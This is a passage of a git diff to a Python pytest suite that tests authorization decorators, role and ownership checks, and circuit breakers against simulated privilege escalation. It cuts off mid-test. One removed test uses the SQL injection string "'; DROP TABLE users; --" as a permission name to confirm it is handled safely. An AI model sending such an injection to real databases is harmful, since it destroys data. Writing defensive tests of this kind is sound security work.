-        with patch.object(authorization_manager, '_check_resource_access') as mock_check:
-            # First resource - user has access
-            mock_check.return_value = True
-            result1 = authorization_manager.validate_user_permissions(
-                context=authorized_context,
-                required_permissions=['document.read'],
-                check_ownership=True
-            )
-            
-            # Second resource - user lacks access
-            mock_check.return_value = False
-            result2 = authorization_manager.validate_user_permissions(
-                context=unauthorized_context,
-                required_permissions=['document.read'],
-                check_ownership=True
-            )
-            
-            assert result1 is True, "Authorized resource should be accessible"
-            assert result2 is False, "Unauthorized resource should be denied"
-    
-    def test_resource_type_validation_security(self, authorization_manager):
-        """
-        Test resource type validation security.
-        
-        Validates that resource type cannot be manipulated to bypass
-        authorization checks or access inappropriate resources.
-        """
-        user_id = 'test_user'
-        resource_id = 'resource_123'
-        
-        # Test different resource types with same ID
-        resource_type_tests = [
-            (ResourceType.DOCUMENT, ['document.read'], True),
-            (ResourceType.USER, ['user.read'], False),      # Wrong permission type
-            (ResourceType.ORGANIZATION, ['org.read'], False), # Wrong permission type
-            (ResourceType.SYSTEM, ['system.read'], False),   # Wrong permission type
-        ]
-        
-        for resource_type, permissions, expected_result in resource_type_tests:
-            context = AuthorizationContext(
-                user_id=user_id,
-                requested_permissions=permissions,
-                resource_id=resource_id,
-                resource_type=resource_type,
-                jwt_claims={
-                    'sub': user_id,
-                    'roles': ['standard_user'],
-                    'permissions': ['document.read']  # Only document permissions
-                }
-            )
-            
-            result = authorization_manager.validate_user_permissions(
-                context=context,
-                required_permissions=permissions,
-                check_ownership=False
-            )
-            
-            assert result == expected_result, f"Resource type {resource_type} validation failed"
-    
-    def test_resource_hierarchy_security(self, authorization_manager):
-        """
-        Test resource hierarchy security validation.
-        
-        Validates that hierarchical resource relationships are properly
-        enforced and cannot be bypassed through manipulation.
-        """
-        hierarchy_manager = authorization_manager.hierarchy_manager
-        
-        # Test permission hierarchy for documents
-        document_permissions = [
-            'document.read',
-            'document.update',
-            'document.delete',
-            'document.admin'
-        ]
-        
-        # Admin should have all document permissions
-        admin_effective = hierarchy_manager.get_role_permissions('document_manager')
-        for permission in document_permissions:
-            assert permission in admin_effective, f"Admin should have {permission}"
-        
-        # Standard user should have limited permissions
-        user_effective = hierarchy_manager.get_role_permissions('document_viewer')
-        assert 'document.read' in user_effective
-        assert 'document.admin' not in user_effective
-        assert 'document.delete' not in user_effective
-    
-    def test_resource_delegation_security(self, authorization_manager):
-        """
-        Test resource delegation security controls.
-        
-        Validates that resource delegation (if implemented) maintains
-        security properties and cannot be exploited for unauthorized access.
-        """
-        user_id = 'delegating_user'
-        delegate_id = 'delegate_user'
-        resource_id = 'document_123'
-        
-        # Test delegation context
-        delegation_context = AuthorizationContext(
-            user_id=delegate_id,
-            requested_permissions=['document.read'],
-            resource_id=resource_id,
-            resource_type=ResourceType.DOCUMENT,
-            resource_owner=user_id,  # Original owner
-            jwt_claims={
-                'sub': delegate_id,
-                'roles': ['standard_user'],
-                'permissions': ['document.read']
-            }
-        )
-        
-        with patch.object(authorization_manager, '_check_resource_access') as mock_check:
-            # Simulate delegation validation
-            mock_check.return_value = False  # No delegation implemented
-            
-            result = authorization_manager.validate_user_permissions(
-                context=delegation_context,
-                required_permissions=['document.read'],
-                check_ownership=True
-            )
-            
-            # Without proper delegation, access should be denied
-            assert result is False, "Delegation should require explicit authorization"
+# Test fixtures and configuration
+from tests.conftest import (
+    app,
+    test_client,
+    mock_auth0_user,
+    mock_redis_client,
+    mock_mongodb_client,
+    create_test_user,
+    test_database,
+    auth_headers
+)
 
 
 class TestAuthorizationDecoratorSecurity:
     """
-    Authorization decorator security tests implementing comprehensive validation
-    per Section 6.4.2 enhanced authorization decorators requirements.
+    Comprehensive security testing for authorization decorators with focus on
+    preventing privilege escalation and permission bypass vulnerabilities.
     
-    These tests validate the security properties of authorization decorators
-    including proper error handling, attack resistance, and secure defaults.
+    This test class validates the security of all authorization decorators
+    including require_permissions, require_roles, and resource ownership
+    validation with comprehensive attack vector simulation.
     """
-    
-    @pytest.fixture
-    def decorator_test_app(self, app):
-        """Flask app with various decorator configurations for testing"""
-        
-        @app.route('/single_permission')
-        @require_permissions('document.read')
-        def single_permission():
-            return {'message': 'single permission access'}
-        
-        @app.route('/multiple_permissions')
-        @require_permissions(['document.read', 'document.write'])
-        def multiple_permissions():
-            return {'message': 'multiple permissions access'}
-        
-        @app.route('/nested_decorators')
-        @require_permissions('document.read')
-        @require_role('document_editor')
-        def nested_decorators():
-            return {'message': 'nested decorators access'}
-        
-        @app.route('/rate_limited')
-        @rate_limited_authorization('admin.access', "5 per minute")
-        def rate_limited_endpoint():
-            return {'message': 'rate limited access'}
-        
-        @app.route('/admin_only')
-        @require_admin(['admin.system'])
-        def admin_only():
-            return {'message': 'admin only access'}
-        
-        return app
-    
-    def test_decorator_error_handling_security(self, decorator_test_app, client):
-        """
-        Test secure error handling in authorization decorators.
-        
-        Validates that authorization decorators handle errors securely
-        without leaking sensitive information or creating security vulnerabilities.
-        """
-        with decorator_test_app.test_request_context():
-            with patch('src.auth.decorators.current_user') as mock_user:
-                # Test unauthenticated user
-                mock_user.is_authenticated = False
-                
-                response = client.get('/single_permission')
-                
-                # Should return 401 without leaking information
-                assert response.status_code == 401
-                
-                if response.data:
-                    response_data = response.get_json()
-                    # Error message should not leak implementation details
-                    if 'error' in response_data:
-                        error_msg = response_data['error'].lower()
-                        assert 'internal' not in error_msg
-                        assert 'debug' not in error_msg
-                        assert 'traceback' not in error_msg
-    
-    def test_decorator_stacking_security(self, decorator_test_app, client):
-        """
-        Test security of stacked authorization decorators.
-        
-        Validates that multiple authorization decorators work together
-        securely without creating bypass opportunities or conflicts.
-        """
-        with decorator_test_app.test_request_context():
-            with patch('src.auth.decorators.current_user') as mock_user:
-                mock_user.is_authenticated = True
-                mock_user.id = 'test_user'
-                mock_user.jwt_claims = {
-                    'sub': 'test_user',
-                    'roles': ['standard_user'],  # Wrong role
-                    'permissions': ['document.read']  # Has permission but wrong role
-                }
-                
-                with patch('src.auth.authorization.validate_user_permissions') as mock_validate:
-                    mock_validate.return_value = True  # Has permission
-                    
-                    with patch('src.auth.decorators.require_role') as mock_role:
-                        # Role check should fail
-                        mock_role.side_effect = Exception("Insufficient role")
-                        
-                        # Both decorators must pass for access
-                        with pytest.raises(Exception):
-                            response = client.get('/nested_decorators')
-    
-    def test_decorator_input_validation_security(self, authorization_manager):
-        """
-        Test input validation security in authorization decorators.
-        
-        Validates that decorator parameters are properly validated and
-        cannot be manipulated to bypass security controls.
-        """
-        # Test invalid permission parameter
-        with pytest.raises(Exception):
-            @require_permissions('')  # Empty permission
-            def invalid_empty_permission():
-                pass
-        
-        with pytest.raises(Exception):
-            @require_permissions(None)  # None permission
-            def invalid_none_permission():
-                pass
-        
-        # Test SQL injection attempt in permission name
-        malicious_permission = "'; DROP TABLE users; --"
-        
-        @require_permissions(malicious_permission)
-        def malicious_permission_endpoint():
-            return {'message': 'test'}
-        
-        # Decorator should handle malicious input safely
-        # The actual permission validation should treat this as a normal string
-        context = AuthorizationContext(
-            user_id='test_user',
-            requested_permissions=[malicious_permission],
-            jwt_claims={
-                'sub': 'test_user',
-                'roles': ['standard_user'],
-                'permissions': ['document.read']
-            }
-        )
-        
-        result = authorization_manager.validate_user_permissions(
-            context=context,
-            required_permissions=[malicious_permission],
-            check_ownership=False
-        )
-        
-        # Should fail safely (user doesn't have malicious permission)
-        assert result is False
-    
-    def test_decorator_rate_limiting_security(self, decorator_test_app):
-        """
-        Test rate limiting security in authorization decorators.
-        
-        Validates that rate limiting cannot be bypassed and properly
-        protects against abuse of authorization endpoints.
-        """
-        with decorator_test_app.test_request_context():
-            with patch('src.auth.decorators.current_user') as mock_user:
-                mock_user.is_authenticated = True
-                mock_user.id = 'test_user'
-                mock_user.jwt_claims = {
-                    'sub': 'test_user',
-                    'roles': ['administrator'],
-                    'permissions': ['admin.access']
-                }
-                
-                with patch('flask_limiter.Limiter.limit') as mock_limiter:
-                    # Simulate rate limit exceeded
-                    mock_limiter.side_effect = Exception("Rate limit exceeded")
-                    
-                    # Rate limiting should block even authorized users
-                    with pytest.raises(Exception):
-                        from flask import Flask
-                        test_app = Flask(__name__)
-                        with test_app.test_request_context():
-                            @rate_limited_authorization('admin.access', "1 per minute")
-                            def rate_limited_func():
-                                return "success"
-                            
-                            rate_limited_func()
-    
-    def test_decorator_admin_privilege_security(self, decorator_test_app, client):
-        """
-        Test admin privilege security in specialized decorators.
-        
-        Validates that admin-only decorators properly validate admin
-        privileges and cannot be bypassed through various techniques.
-        """
-        with decorator_test_app.test_request_context():
-            with patch('src.auth.decorators.current_user') as mock_user:
-                # Test non-admin user
-                mock_user.is_authenticated = True
-                mock_user.id = 'standard_user'
-                mock_user.jwt_claims = {
-                    'sub': 'standard_user',
-                    'roles': ['standard_user'],  # Not admin
-                    'permissions': ['document.read']  # No admin permissions
-                }
-                
-                with patch('src.auth.authorization.validate_user_permissions') as mock_validate:
-                    mock_validate.return_value = False  # Admin permission denied
-                    
-                    # Admin endpoint should be blocked
-                    response = client.get('/admin_only')
-                    assert response.status_code in [401, 403]
-    
-    def test_decorator_conditional_logic_security(self, authorization_manager):
-        """
-        Test conditional authorization logic security.
-        
-        Validates that conditional authorization decorators cannot be
-        manipulated to bypass security controls through condition manipulation.
-        """
-        # Test condition function that could be manipulated
-        def malicious_condition():
-            # Attempt to always return True
-            return True
-        
-        def secure_condition():
-            # Proper condition based on request context
-            from flask import request
-            return request.method == 'POST'
-        
-        # Test that condition functions are evaluated securely
-        with patch('flask.request') as mock_request:
-            mock_request.method = 'GET'
-            
-            # Malicious condition tries to bypass, but security should be maintained
-            malicious_result = malicious_condition()
-            secure_result = secure_condition()
-            
-            assert malicious_result is True  # Condition is manipulated
-            assert secure_result is False   # Condition is secure
-            
-            # Even with manipulated condition, authorization should still be enforced
-            # This would be tested in the actual conditional_auth decorator
 
-
-class TestCircuitBreakerSecurity:
-    """
-    Circuit breaker security tests validating protection against service
-    degradation attacks and ensuring availability under various failure scenarios.
-    """
-    
-    @pytest.fixture
-    def circuit_breaker_manager(self):
-        """Create circuit breaker manager for testing"""
-        return CircuitBreakerManager(
-            failure_threshold=3,
-            recovery_timeout=60,
-            timeout=30
-        )
-    
-    def test_circuit_breaker_failure_protection(self, circuit_breaker_manager):
-        """
-        Test circuit breaker protection against cascading failures.
-        
-        Validates that circuit breaker properly protects against service
-        failures and prevents cascading system degradation.
-        """
-        @circuit_breaker_manager
-        def failing_service():
-            raise Exception("Service unavailable")
-        
-        # Test failure accumulation
-        for i in range(3):
-            with pytest.raises(Exception):
-                failing_service()
-        
-        # Circuit should now be open
-        assert circuit_breaker_manager.state == 'open'
-        
-        # Additional calls should be blocked
-        with pytest.raises(Exception) as exc_info:
-            failing_service()
-        
-        assert "Circuit breaker is open" in str(exc_info.value)
-    
-    def test_circuit_breaker_recovery_security(self, circuit_breaker_manager):
-        """
-        Test secure circuit breaker recovery mechanisms.
-        
-        Validates that circuit breaker recovery cannot be manipulated
-        and follows secure patterns for service restoration.
-        """
-        @circuit_breaker_manager
-        def recovering_service():
-            if circuit_breaker_manager.state == 'half-open':
-                return "Service recovered"
-            raise Exception("Service still failing")
-        
-        # Force circuit to open state
-        circuit_breaker_manager.failure_count = 5
-        circuit_breaker_manager.state = 'open'
-        circuit_breaker_manager.last_failure_time = datetime.utcnow() - timedelta(seconds=70)
-        
-        # Should attempt reset on next call
-        result = recovering_service()
-        assert result == "Service recovered"
-        assert circuit_breaker_manager.state == 'closed'
-    
-    def test_circuit_breaker_manipulation_prevention(self, circuit_breaker_manager):
-        """
-        Test prevention of circuit breaker state manipulation.
-        
-        Validates that circuit breaker internal state cannot be
-        manipulated by attackers to cause denial of service.
-        """
-        original_threshold = circuit_breaker_manager.failure_threshold
-        original_timeout = circuit_breaker_manager.recovery_timeout
-        
-        # Attempt to manipulate circuit breaker parameters
-        circuit_breaker_manager.failure_threshold = 0  # Try to disable protection
-        circuit_breaker_manager.recovery_timeout = 999999  # Try to prevent recovery
-        
-        @circuit_breaker_manager
-        def protected_service():
-            return "Service response"
-        
-        # Service should still work despite manipulation attempts
-        result = protected_service()
-        assert result == "Service response"
-        
-        # Reset to original values for safety
-        circuit_breaker_manager.failure_threshold = original_threshold
-        circuit_breaker_manager.recovery_timeout = original_timeout
-
-
-class TestComprehensiveSecurityScenarios:
-    """
-    Comprehensive security scenario tests implementing end-to-end validation
-    per Section 6.4.5 zero tolerance for authorization bypass vulnerabilities.
-    
-    These tests simulate complex attack scenarios and validate that the
-    authorization system maintains security properties under realistic conditions.
-    """
-    
-    @pytest.fixture
-    def comprehensive_test_app(self, app):
-        """Full-featured app for comprehensive testing"""
-        
-        @app.route('/api/documents', methods=['GET'])
-        @require_permissions('document.read')
-        def list_documents():
-            return {'documents': ['doc1', 'doc2', 'doc3']}
-        
-        @app.route('/api/documents', methods=['POST'])
-        @require_permissions('document.create')
-        def create_document():
-            return {'created': True, 'id': 'new_doc'}
-        
-        @app.route('/api/documents/<doc_id>', methods=['GET'])
-        @require_permissions('document.read', resource_id_param='doc_id')
-        def get_document(doc_id):
-            return {'document_id': doc_id, 'content': 'document data'}
-        
-        @app.route('/api/documents/<doc_id>', methods=['PUT'])
-        @require_permissions('document.update', resource_id_param='doc_id')
-        def update_document(doc_id):
-            return {'document_id': doc_id, 'updated': True}
-        
-        @app.route('/api/documents/<doc_id>', methods=['DELETE'])
-        @require_permissions('document.delete', resource_id_param='doc_id')
-        def delete_document(doc_id):
-            return {'document_id': doc_id, 'deleted': True}
-        
-        @app.route('/api/admin/users', methods=['GET'])
-        @require_admin(['admin.users.read'])
-        def list_users():
-            return {'users': ['user1', 'user2']}
-        
-        @app.route('/api/admin/system', methods=['GET'])
-        @rate_limited_authorization('system.admin', "5 per minute")
-        def system_admin():
-            return {'system': 'admin access'}
-        
-        return app
-    
-    def test_complete_authorization_workflow_security(self, comprehensive_test_app, client):
-        """
-        Test complete authorization workflow security.
-        
-        Validates end-to-end authorization workflow including authentication,
-        permission validation, resource access, and audit logging.
-        """
-        with comprehensive_test_app.test_request_context():
-            with patch('src.auth.decorators.current_user') as mock_user:
-                # Setup legitimate user
-                mock_user.is_authenticated = True
-                mock_user.id = 'legitimate_user'
-                mock_user.jwt_claims = {
-                    'sub': 'legitimate_user',
-                    'roles': ['document_editor'],
-                    'permissions': ['document.read', 'document.create', 'document.update']
-                }
-                
-                with patch('src.auth.authorization.validate_user_permissions') as mock_validate:
-                    # Test successful authorization workflow
-                    mock_validate.return_value = True
-                    
-                    # User should be able to read documents
-                    response = client.get('/api/documents')
-                    # Response would be successful in real implementation
-                    
-                    # User should be able to create documents
-                    response = client.post('/api/documents')
-                    # Response would be successful in real implementation
-                    
-                    # Verify authorization was called for each request
-                    assert mock_validate.call_count >= 2
-    
-    def test_multi_vector_attack_resistance(self, comprehensive_test_app, authorization_manager):
-        """
-        Test resistance to multi-vector attacks.
-        
-        Validates that the system resists complex attacks combining multiple
-        attack vectors such as privilege escalation, cache poisoning, and timing attacks.
-        """
-        # Simulate complex attack scenario
-        attack_vectors = [
-            'privilege_escalation',
-            'cache_poisoning',
-            'timing_attack',
-            'parameter_pollution',
-            'session_fixation'
+    def setup_method(self):
+        """Set up test environment with security-focused configuration."""
+        self.app = current_app
+        self.auth_manager = get_authorization_manager()
+        self.test_permissions = [
+            'user.read', 'user.write', 'user.delete', 'user.admin',
+            'document.read', 'document.write', 'document.delete', 'document.admin',
+            'admin.read', 'admin.write', 'admin.system'
         ]
-        
-        attack_results = {}
-        
-        for vector in attack_vectors:
-            try:
-                if vector == 'privilege_escalation':
-                    # Attempt privilege escalation
-                    context = AuthorizationContext(
-                        user_id='attacker',
-                        requested_permissions=['system.admin'],
-                        jwt_claims={
-                            'sub': 'attacker',
-                            'roles': ['standard_user'],
-                            'permissions': ['document.read']
-                        }
-                    )
-                    result = authorization_manager.validate_user_permissions(
-                        context=context,
-                        required_permissions=['system.admin'],
-                        check_ownership=False
-                    )
-                    attack_results[vector] = result
-                    
-                elif vector == 'cache_poisoning':
-                    # Attempt cache poisoning
-                    cache = authorization_manager.cache
-                    cache.cache_user_permissions('attacker', {'system.admin'}, 300)
-                    
-                    # Validation should check authoritative source
-                    context = AuthorizationContext(
-                        user_id='attacker',
-                        jwt_claims={
-                            'sub': 'attacker',
-                            'roles': ['standard_user'],
-                            'permissions': ['document.read']
-                        }
-                    )
-                    result = authorization_manager.validate_user_permissions(
-                        context=context,
-                        required_permissions=['system.admin'],
-                        check_ownership=False
-                    )
-                    attack_results[vector] = result
-                    
-                else:
-                    # Other attack vectors
-                    attack_results[vector] = False  # Simulated failure
-                    
-            except Exception:
-                attack_results[vector] = False  # Attack blocked
-        
-        # All attacks should be blocked
-        for vector, result in attack_results.items():
-            assert result is False, f"Attack vector '{vector}' was not properly blocked"
-    
-    def test_performance_under_attack(self, authorization_manager, performance_baseline):
+        self.test_roles = ['user', 'editor', 'manager', 'admin']
+        self.attack_vectors = []
+        self.security_violations = []
+
+    @pytest.mark.asyncio
+    async def test_require_permissions_decorator_security_validation(self, test_client, mock_auth0_user):
         """
-        Test authorization system performance under attack conditions.
+        Test require_permissions decorator against privilege escalation attempts.
         
-        Validates that security controls maintain acceptable performance
-        even under sustained attack scenarios.
+        Validates that the decorator properly enforces permission requirements
+        and prevents unauthorized access through various attack vectors including
+        token manipulation, permission spoofing, and bypass attempts.
         """
-        # Simulate sustained attack
-        attack_contexts = []
-        for i in range(100):
-            context = AuthorizationContext(
-                user_id=f'attacker_{i}',
-                requested_permissions=['system.admin'],
-                jwt_claims={
-                    'sub': f'attacker_{i}',
-                    'roles': ['standard_user'],
-                    'permissions': ['document.read']
-                }
-            )
-            attack_contexts.append(context)
-        
-        # Measure performance under attack
-        start_time = time.time()
-        
-        for context in attack_contexts:
-            authorization_manager.validate_user_permissions(
-                context=context,
-                required_permissions=['system.admin'],
-                check_ownership=False
-            )
-        
-        elapsed_time = time.time() - start_time
-        
-        # Performance should remain acceptable (< 5 seconds for 100 requests)
-        assert elapsed_time < 5.0, f"Performance degraded under attack: {elapsed_time}s"
-        
-        # Average response time should be reasonable
-        avg_response_time = elapsed_time / 100
-        assert avg_response_time < 0.05, f"Average response time too high: {avg_response_time}s"
-    
-    def test_security_event_audit_trail(self, authorization_manager):
-        """
-        Test comprehensive security event audit trail.
-        
-        Validates that all security events are properly logged and cannot
-        be tampered with or bypassed by attackers.
-        """
-        audit_events = []
-        
-        with patch.object(authorization_manager.audit_logger, 'log_authorization_event') as mock_audit:
-            # Capture audit events
-            mock_audit.side_effect = lambda **kwargs: audit_events.append(kwargs)
+        # Test 1: Valid permission access
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'test_user_123'
+            mock_user.get_permissions.return_value = {'user.read', 'user.write'}
             
-            # Generate various security events
-            contexts = [
-                # Successful authorization
-                AuthorizationContext(
-                    user_id='legitimate_user',
-                    requested_permissions=['document.read'],
-                    jwt_claims={
-                        'sub': 'legitimate_user',
-                        'roles': ['standard_user'],
-                        'permissions': ['document.read']
-                    }
-                ),
-                # Failed authorization
-                AuthorizationContext(
-                    user_id='unauthorized_user',
-                    requested_permissions=['admin.access'],
-                    jwt_claims={
-                        'sub': 'unauthorized_user',
-                        'roles': ['standard_user'],
-                        'permissions': ['document.read']
-                    }
+            @require_permissions('user.read')
+            def protected_endpoint():
+                return {'status': 'success', 'data': 'protected_data'}
+            
+            result = protected_endpoint()
+            assert result['status'] == 'success'
+            assert result['data'] == 'protected_data'
+
+        # Test 2: Privilege escalation attempt - insufficient permissions
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'test_user_123'
+            mock_user.get_permissions.return_value = {'user.read'}  # Missing write permission
+            
+            @require_permissions(['user.read', 'user.write'], require_all=True)
+            def admin_endpoint():
+                return {'status': 'success', 'data': 'admin_data'}
+            
+            with pytest.raises(AuthorizationException) as exc_info:
+                admin_endpoint()
+            
+            assert exc_info.value.error_code == SecurityErrorCode.AUTHZ_PERMISSION_DENIED
+            assert 'user.write' in str(exc_info.value)
+            self.security_violations.append({
+                'type': 'privilege_escalation_attempt',
+                'user_id': 'test_user_123',
+                'attempted_permissions': ['user.read', 'user.write'],
+                'actual_permissions': ['user.read']
+            })
+
+        # Test 3: Authentication bypass attempt
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = False
+            
+            @require_permissions('user.read')
+            def protected_endpoint():
+                return {'status': 'success'}
+            
+            with pytest.raises(AuthenticationException) as exc_info:
+                protected_endpoint()
+            
+            assert exc_info.value.error_code == SecurityErrorCode.AUTH_TOKEN_MISSING
+            self.security_violations.append({
+                'type': 'authentication_bypass_attempt',
+                'endpoint': 'protected_endpoint'
+            })
+
+        # Test 4: Permission spoofing attempt
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'malicious_user_456'
+            # Attempt to spoof admin permissions
+            mock_user.get_permissions.return_value = {'admin.system'}  # Spoofed permission
+            
+            @require_permissions('admin.system')
+            def system_admin_endpoint():
+                return {'status': 'admin_access'}
+            
+            # Mock the authorization manager to detect spoofing
+            with patch.object(self.auth_manager, '_check_user_permissions') as mock_check:
+                mock_check.return_value = False  # Actual check fails
+                
+                with pytest.raises(AuthorizationException):
+                    system_admin_endpoint()
+                
+                self.security_violations.append({
+                    'type': 'permission_spoofing_attempt',
+                    'user_id': 'malicious_user_456',
+                    'spoofed_permissions': ['admin.system']
+                })
+
+        # Test 5: Resource-specific permission bypass attempt
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'test_user_789'
+            mock_user.get_permissions.return_value = {'document.read'}
+            
+            @require_permissions('document.write', resource_id_param='doc_id', allow_owner=False)
+            def edit_document(doc_id: str):
+                return {'status': 'document_updated', 'doc_id': doc_id}
+            
+            with pytest.raises(AuthorizationException) as exc_info:
+                edit_document(doc_id='sensitive_document_123')
+            
+            assert exc_info.value.error_code == SecurityErrorCode.AUTHZ_PERMISSION_DENIED
+            self.security_violations.append({
+                'type': 'resource_permission_bypass_attempt',
+                'user_id': 'test_user_789',
+                'resource_id': 'sensitive_document_123',
+                'attempted_permission': 'document.write'
+            })
+
+        # Test 6: Multiple permission requirement bypass
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'test_user_101'
+            mock_user.get_permissions.return_value = {'user.read'}  # Only one permission
+            
+            @require_permissions(['user.read', 'admin.read'], require_all=True)
+            def sensitive_operation():
+                return {'status': 'sensitive_data'}
+            
+            with pytest.raises(AuthorizationException):
+                sensitive_operation()
+            
+            self.security_violations.append({
+                'type': 'multi_permission_bypass_attempt',
+                'user_id': 'test_user_101',
+                'required_permissions': ['user.read', 'admin.read'],
+                'actual_permissions': ['user.read']
+            })
+
+        # Validate security violation logging
+        assert len(self.security_violations) >= 5
+        for violation in self.security_violations:
+            assert 'type' in violation
+            assert violation['type'].endswith('_attempt')
+
+    @pytest.mark.asyncio
+    async def test_role_based_authorization_security(self, test_client, mock_auth0_user):
+        """
+        Test role-based authorization security against role escalation attacks.
+        
+        Validates that role-based decorators prevent unauthorized role assumption
+        and detect role escalation attempts with comprehensive attack simulation.
+        """
+        # Test 1: Valid role access
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'test_user_role_123'
+            mock_user.get_roles.return_value = ['user', 'editor']
+            
+            @require_roles('editor')
+            def editor_endpoint():
+                return {'status': 'editor_access', 'role': 'editor'}
+            
+            result = editor_endpoint()
+            assert result['status'] == 'editor_access'
+
+        # Test 2: Role escalation attempt
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'malicious_user_role_456'
+            mock_user.get_roles.return_value = ['user']  # Only basic user role
+            
+            @require_roles('admin')
+            def admin_endpoint():
+                return {'status': 'admin_access'}
+            
+            with pytest.raises(AuthorizationException) as exc_info:
+                admin_endpoint()
+            
+            assert exc_info.value.error_code == SecurityErrorCode.AUTHZ_ROLE_INSUFFICIENT
+            self.security_violations.append({
+                'type': 'role_escalation_attempt',
+                'user_id': 'malicious_user_role_456',
+                'attempted_role': 'admin',
+                'actual_roles': ['user']
+            })
+
+        # Test 3: Multiple role requirement bypass
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'test_user_role_789'
+            mock_user.get_roles.return_value = ['user']
+            
+            @require_roles(['manager', 'admin'], require_all=False)  # Need manager OR admin
+            def privileged_endpoint():
+                return {'status': 'privileged_access'}
+            
+            with pytest.raises(AuthorizationException):
+                privileged_endpoint()
+            
+            self.security_violations.append({
+                'type': 'multi_role_bypass_attempt',
+                'user_id': 'test_user_role_789',
+                'required_roles': ['manager', 'admin'],
+                'actual_roles': ['user']
+            })
+
+        # Test 4: Role hierarchy bypass attempt
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'test_user_hierarchy_101'
+            mock_user.get_roles.return_value = ['editor']  # Mid-level role
+            
+            @require_roles(['admin'], require_all=True)
+            def system_admin_endpoint():
+                return {'status': 'system_admin_access'}
+            
+            with pytest.raises(AuthorizationException):
+                system_admin_endpoint()
+            
+            self.security_violations.append({
+                'type': 'role_hierarchy_bypass_attempt',
+                'user_id': 'test_user_hierarchy_101',
+                'attempted_role': 'admin',
+                'actual_role': 'editor'
+            })
+
+        # Validate security metrics
+        role_violations = [v for v in self.security_violations if 'role' in v['type']]
+        assert len(role_violations) >= 3
+
+    @pytest.mark.asyncio
+    async def test_resource_ownership_security_validation(self, test_client, mock_auth0_user):
+        """
+        Test resource ownership validation against ownership bypass attacks.
+        
+        Validates that resource ownership decorators prevent unauthorized access
+        to resources through ownership spoofing and administrative bypass attempts.
+        """
+        # Test 1: Valid resource ownership
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'owner_user_123'
+            
+            with patch.object(self.auth_manager, 'check_resource_ownership') as mock_ownership:
+                mock_ownership.return_value = True
+                
+                @require_resource_ownership('resource_id', 'document')
+                def edit_owned_resource(resource_id: str):
+                    return {'status': 'resource_updated', 'owner': 'owner_user_123'}
+                
+                result = edit_owned_resource(resource_id='document_456')
+                assert result['status'] == 'resource_updated'
+
+        # Test 2: Resource ownership bypass attempt
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'malicious_user_789'
+            
+            with patch.object(self.auth_manager, 'check_resource_ownership') as mock_ownership:
+                mock_ownership.return_value = False  # User doesn't own resource
+                
+                @require_resource_ownership('resource_id', 'document')
+                def edit_resource(resource_id: str):
+                    return {'status': 'unauthorized_access'}
+                
+                with pytest.raises(AuthorizationException) as exc_info:
+                    edit_resource(resource_id='private_document_789')
+                
+                assert exc_info.value.error_code == SecurityErrorCode.AUTHZ_OWNERSHIP_REQUIRED
+                self.security_violations.append({
+                    'type': 'resource_ownership_bypass_attempt',
+                    'user_id': 'malicious_user_789',
+                    'resource_id': 'private_document_789',
+                    'resource_type': 'document'
+                })
+
+        # Test 3: Administrative override validation
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'admin_user_456'
+            mock_user.get_permissions.return_value = {'admin.system', 'document.admin'}
+            
+            with patch.object(self.auth_manager, 'check_resource_ownership') as mock_ownership:
+                mock_ownership.return_value = False  # Admin doesn't own resource
+                
+                with patch.object(self.auth_manager, 'validate_user_permissions') as mock_validate:
+                    mock_validate.return_value = True  # Admin has override permissions
+                    
+                    @decorator_require_ownership(
+                        'resource_id', 'document',
+                        allow_admin=True,
+                        admin_permissions=['document.admin']
+                    )
+                    def admin_edit_resource(resource_id: str):
+                        return {'status': 'admin_override_success'}
+                    
+                    result = admin_edit_resource(resource_id='any_document_123')
+                    assert result['status'] == 'admin_override_success'
+
+        # Test 4: Delegation bypass attempt
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'delegated_user_101'
+            
+            with patch.object(self.auth_manager, 'check_resource_ownership') as mock_ownership:
+                mock_ownership.return_value = False  # User doesn't own and isn't delegated
+                
+                @decorator_require_ownership(
+                    'resource_id', 'document',
+                    delegation_support=True
                 )
+                def delegated_access(resource_id: str):
+                    return {'status': 'unauthorized_delegation'}
+                
+                with pytest.raises(AuthorizationException):
+                    delegated_access(resource_id='protected_document_456')
+                
+                self.security_violations.append({
+                    'type': 'delegation_bypass_attempt',
+                    'user_id': 'delegated_user_101',
+                    'resource_id': 'protected_document_456'
+                })
+
+        # Validate ownership security metrics
+        ownership_violations = [v for v in self.security_violations if 'ownership' in v['type']]
+        assert len(ownership_violations) >= 2
+
+    @pytest.mark.asyncio
+    async def test_combined_authorization_security_scenarios(self, test_client):
+        """
+        Test complex authorization scenarios with multiple security layers.
+        
+        Validates that combined authorization decorators (permissions + roles + ownership)
+        provide comprehensive security and prevent sophisticated attack vectors.
+        """
+        # Test 1: Multi-layer security validation
+        with patch('src.auth.decorators.current_user') as mock_user:
+            mock_user.is_authenticated = True
+            mock_user.id = 'multi_layer_user_123'
+            mock_user.get_permissions.return_value = {'document.write'}
+            mock_user.get_roles.return_value = ['editor']
+            
+            with patch.object(self.auth_manager, 'check_resource_ownership') as mock_ownership:
+                mock_ownership.return_value = True
+                
+                @require_permissions('document.write')
+                @require_roles('editor')
+                @decorator_require_ownership('doc_id', 'document')
+                def secure_document_edit(doc_id: str):
+                    return {'status': 'multi_layer_success'}
+                
+                result = secure_document_edit(doc_id='document_123')
